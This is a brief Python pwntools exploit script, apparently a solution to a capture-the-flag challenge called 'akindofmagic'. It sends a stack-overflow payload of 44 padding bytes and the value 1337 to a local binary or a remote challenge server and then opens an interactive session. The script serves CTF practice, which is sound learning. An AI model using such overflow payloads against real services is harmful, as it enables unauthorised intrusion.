#!/usr/bin/python3
import pwn
path = './akindofmagic'
elf = pwn.context.binary = pwn.ELF(path)
if pwn.args.GDB:
    io = pwn.gdb.debug(path, gdbscript="")
else:
    if pwn.args.REMOTE:
        io = pwn.remote("143.198.184.186", 5000)
    else:
        io = elf.process()
payload = b'A'*44
payload += pwn.p32(1337)
io.sendline(payload)
io.interactive()
